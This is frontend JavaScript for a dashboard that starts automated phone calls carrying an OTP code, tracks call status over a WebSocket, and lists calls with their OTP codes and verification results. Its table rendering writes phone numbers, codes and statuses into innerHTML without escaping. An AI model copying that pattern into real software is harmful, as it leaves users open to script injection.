// Frontend JavaScript
let ws = null;

document.addEventListener('DOMContentLoaded', () => {
    connectWebSocket();
    loadStats();
    loadCalls();
    setupTriggerForm();
    setInterval(loadCalls, 10000);
    setInterval(loadStats, 15000);
});

function connectWebSocket() {
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}/ws`;
    
    try {
        ws = new WebSocket(wsUrl);
        
        ws.onopen = () => {
            console.log('✅ WebSocket connected');
            updateConnectionStatus(true);
        };
        
        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            handleWebSocketMessage(data);
        };
        
        ws.onerror = (error) => {
            console.error('❌ WebSocket error:', error);
            updateConnectionStatus(false);
        };
        
        ws.onclose = () => {
            console.log('🔌 WebSocket disconnected');
            updateConnectionStatus(false);
            setTimeout(connectWebSocket, 5000);
        };
    } catch (error) {
        console.error('❌ Connection error:', error);
        updateConnectionStatus(false);
    }
}

function handleWebSocketMessage(data) {
    switch (data.type) {
        case 'connected':
            showToast('Connected to monitoring', 'success');
            break;
        case 'call_initiated':
            showToast(`Call to ${data.phoneNumber}`, 'info');
            loadCalls();
            loadStats();
            break;
        case 'call_answered':
            showToast('Call answered', 'success');
            loadCalls();
            break;
        case 'call_event':
            loadCalls();
            loadStats();
            break;
        case 'dtmf_received':
            showToast(data.isValid ? '✅ OTP verified' : '❌ Invalid OTP', data.isValid ? 'success' : 'error');
            break;
    }
}

function setupTriggerForm() {
    const form = document.getElementById('trigger-form');
    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const phoneNumber = document.getElementById('phone-number').value.trim();
        const otpCode = document.getElementById('otp-code').value.trim();
        const language = document.getElementById('language').value;
        const transferNumber = document.getElementById('transfer-number').value.trim();
        
        const btn = form.querySelector('button[type="submit"]');
        btn.disabled = true;
        btn.innerHTML = '<span class="btn-icon">⏳</span> Calling...';
        
        try {
            const response = await fetch('/api/calls/trigger', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phoneNumber, otpCode, language, transferNumber: transferNumber || undefined })
            });
            
            const result = await response.json();
            
            if (response.ok) {
                showToast('Call initiated!', 'success');
                form.reset();
                loadCalls();
                loadStats();
            } else {
                showToast(`Error: ${result.error}`, 'error');
            }
        } catch (error) {
            showToast('Failed to initiate call', 'error');
        } finally {
            btn.disabled = false;
            btn.innerHTML = '<span class="btn-icon">📞</span> Initiate Call';
        }
    });
}

async function loadStats() {
    try {
        const response = await fetch('/api/stats');
        const stats = await response.json();
        document.getElementById('total-calls').textContent = stats.totalCalls || 0;
        document.getElementById('verified-calls').textContent = stats.verifiedCalls || 0;
        document.getElementById('failed-calls').textContent = stats.failedCalls || 0;
        document.getElementById('avg-duration').textContent = stats.avgDuration ? `${Math.round(stats.avgDuration)}s` : '0s';
    } catch (error) {
        console.error('❌ Load stats error:', error);
    }
}

async function loadCalls() {
    try {
        const response = await fetch('/api/calls');
        const calls = await response.json();
        renderCallsTable(calls);
    } catch (error) {
        console.error('❌ Load calls error:', error);
    }
}

function renderCallsTable(calls) {
    const tbody = document.getElementById('calls-tbody');
    if (calls.length === 0) {
        tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No calls yet</td></tr>';
        return;
    }
    tbody.innerHTML = calls.map(call => `
        <tr>
            <td>${formatDate(call.createdAt)}</td>
            <td>${call.phoneNumber}</td>
            <td>${call.otpCode}</td>
            <td><span class="status-badge status-${call.status}">${call.status}</span></td>
            <td>${call.verified ? '✅' : '❌'}</td>
            <td>${call.duration ? `${call.duration}s` : '-'}</td>
        </tr>
    `).join('');
}

function updateConnectionStatus(connected) {
    const dot = document.getElementById('connection-status');
    const text = document.getElementById('connection-text');
    if (connected) {
        dot.className = 'status-dot status-connected';
        text.textContent = 'Connected';
    } else {
        dot.className = 'status-dot status-disconnected';
        text.textContent = 'Disconnected';
    }
}

function formatDate(dateString) {
    if (!dateString) return 'N/A';
    return new Date(dateString).toLocaleString();
}

function showToast(message, type = 'info') {
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.textContent = message;
    container.appendChild(toast);
    setTimeout(() => toast.classList.add('show'), 10);
    setTimeout(() => {
        toast.classList.remove('show');
        setTimeout(() => toast.remove(), 300);
    }, 5000);
}
